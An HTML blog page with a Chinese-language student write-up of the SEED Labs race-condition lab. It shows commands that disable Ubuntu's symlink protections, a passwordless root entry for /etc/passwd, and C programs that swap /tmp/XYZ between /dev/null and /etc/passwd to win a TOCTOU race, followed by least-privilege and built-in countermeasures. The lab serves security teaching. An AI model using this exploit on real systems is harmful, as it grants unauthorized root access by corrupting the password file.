@@ -1,0 +1,337 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Environment Setup下载代码文件，并且关闭 ubuntu 针对竞态条件攻击的内置保护。 sudo sysctl -w fs.protected_symlinks&#x3D;0sudo sysctl fs.protected_regular&#x3D;0  创建 &#x2F;tmp&#x2F;XYZ 文件，并将其链接到 &#x2F;dev&#x2F;null 文件。然后编译代码什么的。 #  Task 1: Choosing Our Targe">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Race-Condition-Vulnerability-Lab">
+<meta property="og:url" content="https://ceyewan.github.io/p/eec1680.html">
+<meta property="og:site_name" content="Ceyewan&#39;s Blog">
+<meta property="og:description" content="Environment Setup下载代码文件，并且关闭 ubuntu 针对竞态条件攻击的内置保护。 sudo sysctl -w fs.protected_symlinks&#x3D;0sudo sysctl fs.protected_regular&#x3D;0  创建 &#x2F;tmp&#x2F;XYZ 文件，并将其链接到 &#x2F;dev&#x2F;null 文件。然后编译代码什么的。 #  Task 1: Choosing Our Targe">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20221113211659068.png">
+<meta property="og:image" content="https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20221113232238538.png">
+<meta property="og:image" content="https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20221114001939672.png">
+<meta property="article:published_time" content="2022-11-14T06:09:48.000Z">
+<meta property="article:modified_time" content="2024-03-28T16:22:46.284Z">
+<meta property="article:author" content="ceyewan">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20221113211659068.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/icons.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/icon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/icon-apple-touch.png">
+        
+      
+    
+    <!-- title -->
+    <title>Race-Condition-Vulnerability-Lab</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+		<script type="text/x-mathjax-config">
+		  MathJax.Hub.Config({
+			tex2jax: {
+			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+			  inlineMath: [['$','$']]
+			}
+		  });
+		</script>
+		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
+	
+<meta name="generator" content="Hexo 7.1.1"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/p/958ee7cd.html"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/p/b0280669.html"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://ceyewan.github.io/p/eec1680.html"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://ceyewan.github.io/p/eec1680.html&text=Race-Condition-Vulnerability-Lab"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://ceyewan.github.io/p/eec1680.html&title=Race-Condition-Vulnerability-Lab"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://ceyewan.github.io/p/eec1680.html&is_video=false&description=Race-Condition-Vulnerability-Lab"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Race-Condition-Vulnerability-Lab&body=Check out this article: https://ceyewan.github.io/p/eec1680.html"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://ceyewan.github.io/p/eec1680.html&title=Race-Condition-Vulnerability-Lab"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://ceyewan.github.io/p/eec1680.html&title=Race-Condition-Vulnerability-Lab"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://ceyewan.github.io/p/eec1680.html&title=Race-Condition-Vulnerability-Lab"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://ceyewan.github.io/p/eec1680.html&title=Race-Condition-Vulnerability-Lab"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://ceyewan.github.io/p/eec1680.html&name=Race-Condition-Vulnerability-Lab&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://ceyewan.github.io/p/eec1680.html&t=Race-Condition-Vulnerability-Lab"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Environment-Setup"><span class="toc-number">1.</span> <span class="toc-text">Environment Setup</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Task-1-Choosing-Our-Target"><span class="toc-number">2.</span> <span class="toc-text">#  Task 1: Choosing Our Target</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Task-2-Launching-the-Race-Condition-Attack"><span class="toc-number">3.</span> <span class="toc-text">Task 2: Launching the Race Condition Attack</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Task-2-A-Simulating-a-Slow-Machine"><span class="toc-number">4.</span> <span class="toc-text"># Task 2.A: Simulating a Slow Machine</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Task-2-B-The-Real-Attack"><span class="toc-number">5.</span> <span class="toc-text"># Task 2.B: The Real Attack</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Task-2-C-An-Improved-Attack-Method"><span class="toc-number">6.</span> <span class="toc-text"># Task 2.C: An Improved Attack Method</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Task-3-Countermeasures"><span class="toc-number">7.</span> <span class="toc-text">Task 3: Countermeasures</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Task-3-A-Applying-the-Principle-of-Least-Privilege"><span class="toc-number">8.</span> <span class="toc-text"># Task 3.A: Applying the Principle of Least Privilege</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Task-3-B-Using-Ubuntu%E2%80%99s-Built-in-Scheme"><span class="toc-number">9.</span> <span class="toc-text"># Task 3.B: Using Ubuntu’s Built-in Scheme</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        Race-Condition-Vulnerability-Lab
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">ceyewan</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2022-11-14T06:09:48.000Z" class="dt-published" itemprop="datePublished">2022-11-14</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/SeedLabs-SoftwareSecurity/">SeedLabs/SoftwareSecurity</a>
+    </div>
+
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="Environment-Setup"><a href="#Environment-Setup" class="headerlink" title="Environment Setup"></a>Environment Setup</h2><p>下载代码文件，并且关闭 <code>ubuntu</code> 针对竞态条件攻击的内置保护。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo sysctl -w fs.protected_symlinks=0</span><br><span class="line">sudo sysctl fs.protected_regular=0</span><br></pre></td></tr></table></figure>
+
+<p>创建 <code>/tmp/XYZ</code> 文件，并将其链接到 <code>/dev/null</code> 文件。然后编译代码什么的。</p>
+<h2 id="Task-1-Choosing-Our-Target"><a href="#Task-1-Choosing-Our-Target" class="headerlink" title="#  Task 1: Choosing Our Target"></a>#  Task 1: Choosing Our Target</h2><p>如果我们向 <code>/etc/passwd</code> 文件中写入一个条目，就相当于添加了一个用户，把第三个参数设置为 0 就相当于把用户设为了 <code>root</code> 用户。第二个参数如果是 <code>x</code> 那么就说明从 <code>/etc/shadow</code> 中查找密码，也可以直接设置密码，但是需要是密码的哈希值。在 <code>Ubuntu live CD</code> 中有一个用于无密码帐户的神奇值，这个神奇值是 <code>U6aMy0wojraho</code>，我们把第二个参数设置为这个就可以得到一个不需要密码的 <code>root</code> 用户。</p>
+<p>我们可以切换到 <code>root</code> 用户，在 <code>/etc/passwd</code> 文件最后面添加 <code>test:U6aMy0wojraho:0:0:test:/root:/bin/bash</code> 然后执行 <code>su test</code>（跳出输入密码直接回车即可），查看这个神奇值在我们的设备上是否生效。</p>
+<p>注意，记得把 <code>passwd</code> 文件备份，避免后续实验导致文件丢失。</p>
+<h2 id="Task-2-Launching-the-Race-Condition-Attack"><a href="#Task-2-Launching-the-Race-Condition-Attack" class="headerlink" title="Task 2: Launching the Race Condition Attack"></a>Task 2: Launching the Race Condition Attack</h2><h2 id="Task-2-A-Simulating-a-Slow-Machine"><a href="#Task-2-A-Simulating-a-Slow-Machine" class="headerlink" title="# Task 2.A: Simulating a Slow Machine"></a># Task 2.A: Simulating a Slow Machine</h2><p>我们在被攻击代码 <code>access</code> 和 <code>fopen</code> 之间添加一个 <code>sleep(10);</code> ，然后编译执行代码，在 <code>sleep</code> 期间，执行 <code>ln -sf /etc/passwd /tmp/XYZ</code>，这样，在确认用户可以访问 <code>XYZ</code> 后，<code>XYZ</code> 被软链接到了 <code>passwd</code> 文件，后续因为被攻击程序是个特权程序，因此 <code>open</code> 和 <code>write</code> 都会以特权程序执行。从而实现了对 <code>passwd</code> 文件的恶意修改。</p>
+<h2 id="Task-2-B-The-Real-Attack"><a href="#Task-2-B-The-Real-Attack" class="headerlink" title="# Task 2.B: The Real Attack"></a># Task 2.B: The Real Attack</h2><p>首先写我们的攻击程序，这段代码不断的把 <code>XYZ</code> 链接到特权程序和非特权程序：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        unlink(<span class="string">&quot;/tmp/XYZ&quot;</span>);</span><br><span class="line">        symlink(<span class="string">&quot;/dev/null&quot;</span>, <span class="string">&quot;/tmp/XYZ&quot;</span>);</span><br><span class="line">        usleep(<span class="number">1000</span>);</span><br><span class="line">        unlink(<span class="string">&quot;/tmp/XYZ&quot;</span>);</span><br><span class="line">        symlink(<span class="string">&quot;/etc/passwd&quot;</span>, <span class="string">&quot;/tmp/XYZ&quot;</span>);</span><br><span class="line">        usleep(<span class="number">1000</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后，执行脚本，脚本的作用就是不断向 <code>XYZ</code> 中写入 <code>test:U6aMy0wojraho:0:0:test:/root:/bin/bash</code>（注意自己修改），在大部分时间要么写到了 <code>/dev/null</code> 中，要么不能写入，因为没有权限。</p>
+<p>但是，当两个程序并发时（通过开两个终端同时执行之），在 <code>XYZ</code> 是 <code>/dev/null</code> 时通过了 <code>access</code> 检查，然后 <code>XYZ</code> 切换到了 <code>passwd</code>，再执行 <code>fopen</code> 和后面的 <code>fwrite</code>，那么就修改了 <code>passwd</code>，得到了 <code>root</code> 权限。</p>
+<p>下面的截图结果我做了点弊，我在 <code>access</code> 和 <code>fopen</code> 之间添加了一点时间，用来让竞态漏洞更好的被执行。如果不加时间，太容易 <code>XYZ</code> 被修改为 <code>root</code> 程序导致我们得把他删了重做。很麻烦，需要大量的重复工作来碰运气。</p>
+<p><img src="https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20221113211659068.png" alt="image-20221113211659068"></p>
+<h2 id="Task-2-C-An-Improved-Attack-Method"><a href="#Task-2-C-An-Improved-Attack-Method" class="headerlink" title="# Task 2.C: An Improved Attack Method"></a># Task 2.C: An Improved Attack Method</h2><p>上面说到，<code>XYZ</code> 太容易变成 <code>root</code> 所属的文件，这个结果也是因为竞态漏洞。当 <code>XYZ</code> 链接到 <code>null</code> 时通过了 <code>access</code>，然后执行了 <code>unlink</code>，这时 <code>XYZ</code> 没有链接到任何一个文件，<code>CPU</code> 切换到 <code>fopen</code>，这时一个特权程序打开这个空文件，将创建一个以 <code>root</code> 作为所有者的新文件。</p>
+<p>因此，我们需要让 <code>XYZ</code> 从链接到 <code>null</code> 到 <code>passwd</code> 这个过程是原子的，我们可以使用 <code>renameat2</code> 这个系统调用来交换两个文件的软链接，这个操作是原子操作。这样就不会导致上面那样的问题了。</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> flags = RENAME_EXCHANGE;</span><br><span class="line">    unlink(<span class="string">&quot;/tmp/XYZ&quot;</span>);</span><br><span class="line">    symlink(<span class="string">&quot;/dev/null&quot;</span>, <span class="string">&quot;/tmp/XYZ&quot;</span>);</span><br><span class="line">    unlink(<span class="string">&quot;/tmp/ABC&quot;</span>);</span><br><span class="line">    symlink(<span class="string">&quot;/etc/passwd&quot;</span>, <span class="string">&quot;/tmp/ABC&quot;</span>);</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        renameat2(<span class="number">0</span>, <span class="string">&quot;/tmp/XYZ&quot;</span>, <span class="number">0</span>, <span class="string">&quot;/tmp/ABC&quot;</span>, flags);</span><br><span class="line">        usleep(<span class="number">1000</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这样的话，执行之后一定能够成功：</p>
+<p><img src="https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20221113232238538.png" alt="image-20221113232238538"></p>
+<h2 id="Task-3-Countermeasures"><a href="#Task-3-Countermeasures" class="headerlink" title="Task 3: Countermeasures"></a>Task 3: Countermeasures</h2><h2 id="Task-3-A-Applying-the-Principle-of-Least-Privilege"><a href="#Task-3-A-Applying-the-Principle-of-Least-Privilege" class="headerlink" title="# Task 3.A: Applying the Principle of Least Privilege"></a># Task 3.A: Applying the Principle of Least Privilege</h2><p>最小权限原则，我们可以把这个特权程序的权限降为真实用户权限，然后再执行：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">FILE* fp;</span><br><span class="line">seteuid(getuid());  <span class="comment">// 把有效用户修改为真实用户</span></span><br><span class="line"><span class="comment">/* get user input */</span></span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%50s&quot;</span>, buffer);</span><br></pre></td></tr></table></figure>
+
+<p>这样，就算我们上面分析的竞态条件发生，调用 <code>open</code> 函数也会没有权限打开 <code>passwd</code> 文件，因为这已经不是个特权程序了。</p>
+<p><img src="https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20221114001939672.png" alt="image-20221114001939672"></p>
+<h2 id="Task-3-B-Using-Ubuntu’s-Built-in-Scheme"><a href="#Task-3-B-Using-Ubuntu’s-Built-in-Scheme" class="headerlink" title="# Task 3.B: Using Ubuntu’s Built-in Scheme"></a># Task 3.B: Using Ubuntu’s Built-in Scheme</h2><p>和上面一样，在竞态条件发生的情况下，会报 <code>open failed</code>（我确信我已经注释过了刚刚添加的代码，并且重新编译过了）。但是，这个比上面 <code>open failed</code> 的比例高得多。测试后发现，<code>XYZ -&gt; /dev/null</code> 的情况也会报这个错，所以这里是 1:1 的报错。上面是少数的 <code>open failed</code> 报错。</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/categories/">Category</a></li>
+        
+          <li><a href="/tags/">Tag</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Environment-Setup"><span class="toc-number">1.</span> <span class="toc-text">Environment Setup</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Task-1-Choosing-Our-Target"><span class="toc-number">2.</span> <span class="toc-text">#  Task 1: Choosing Our Target</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Task-2-Launching-the-Race-Condition-Attack"><span class="toc-number">3.</span> <span class="toc-text">Task 2: Launching the Race Condition Attack</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Task-2-A-Simulating-a-Slow-Machine"><span class="toc-number">4.</span> <span class="toc-text"># Task 2.A: Simulating a Slow Machine</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Task-2-B-The-Real-Attack"><span class="toc-number">5.</span> <span class="toc-text"># Task 2.B: The Real Attack</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Task-2-C-An-Improved-Attack-Method"><span class="toc-number">6.</span> <span class="toc-text"># Task 2.C: An Improved Attack Method</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Task-3-Countermeasures"><span class="toc-number">7.</span> <span class="toc-text">Task 3: Countermeasures</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Task-3-A-Applying-the-Principle-of-Least-Privilege"><span class="toc-number">8.</span> <span class="toc-text"># Task 3.A: Applying the Principle of Least Privilege</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Task-3-B-Using-Ubuntu%E2%80%99s-Built-in-Scheme"><span class="toc-number">9.</span> <span class="toc-text"># Task 3.B: Using Ubuntu’s Built-in Scheme</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://ceyewan.github.io/p/eec1680.html"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://ceyewan.github.io/p/eec1680.html&text=Race-Condition-Vulnerability-Lab"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://ceyewan.github.io/p/eec1680.html&title=Race-Condition-Vulnerability-Lab"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://ceyewan.github.io/p/eec1680.html&is_video=false&description=Race-Condition-Vulnerability-Lab"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Race-Condition-Vulnerability-Lab&body=Check out this article: https://ceyewan.github.io/p/eec1680.html"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://ceyewan.github.io/p/eec1680.html&title=Race-Condition-Vulnerability-Lab"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://ceyewan.github.io/p/eec1680.html&title=Race-Condition-Vulnerability-Lab"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://ceyewan.github.io/p/eec1680.html&title=Race-Condition-Vulnerability-Lab"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://ceyewan.github.io/p/eec1680.html&title=Race-Condition-Vulnerability-Lab"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://ceyewan.github.io/p/eec1680.html&name=Race-Condition-Vulnerability-Lab&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://ceyewan.github.io/p/eec1680.html&t=Race-Condition-Vulnerability-Lab"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+      
+        
+          2016-2024
+  </div>
+  <div class="footer-left">
+    ceyewan
+  </div>
+</footer>
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
